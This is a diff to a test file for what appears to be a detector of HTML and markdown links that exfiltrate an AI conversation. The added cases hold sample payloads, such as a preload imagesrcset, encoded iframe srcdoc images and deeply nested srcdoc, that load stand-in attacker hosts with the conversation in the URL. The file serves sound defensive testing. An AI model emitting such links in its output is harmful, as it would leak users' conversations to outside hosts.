@@ -241,6 +241,15 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<a xlink:href='https://api.test/users/{id}'>user</a>", []),
         ("<link rel='stylesheet' href='https://collector.test/{conversation}.css'>", ["exfiltration_query"]),
         ("<link rel='preload' as='image' href='https://collector.test/{conversation}.png'>", ["exfiltration_query"]),
+        (
+            "<link rel='preload' as='image' imagesrcset='https://a.test/a.png 1x, https://collector.test/{c}.png 2x'>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<iframe srcdoc='&lt;img src=&quot;https://collector.test/{c}.png&quot;&gt;'></iframe>",
+            ["exfiltration_query"],
+        ),
+        ("<iframe srcdoc='&lt;a href=&quot;https://api.test/users/{id}&quot;&gt;x&lt;/a&gt;'></iframe>", []),
         ("<area href='https://api.test/users/{id}'>", []),
         ("<img srcset='https://a.test/i&nbsp;{conversation}.png 1x'>", ["exfiltration_query"]),
         ("<object data='https://collector.test/{conversation}.swf'></object>", ["exfiltration_query"]),
@@ -546,3 +555,19 @@ def test_an_exfiltration_link_used_as_a_schema_key_is_not_echoed() -> None:
     assert result.details is not None
     assert [issue["path"] for issue in result.details["issues"]] == ["/inputSchema/properties"]
     assert "attacker" not in json.dumps(result.to_dict())
+
+
+def test_nested_srcdoc_is_followed_at_every_depth_that_fits() -> None:
+    def nest(html: str, levels: int) -> str:
+        for _ in range(levels):
+            html = "<iframe srcdoc='" + html.replace("&", "&amp;").replace("'", "&#39;").replace("<", "&lt;") + "'>"
+        return html
+
+    image = "<img src='https://collector.test/{c}.png'>"
+    depth = 1
+    while len(nest(image, depth + 1).encode("utf-8")) <= MAX_LINK_MARKDOWN_BYTES:
+        depth += 1
+    assert depth >= 4
+    started = time.perf_counter()
+    assert exfiltration_link_classes(nest(image, depth)) == ["exfiltration_query"]
+    assert time.perf_counter() - started < 5
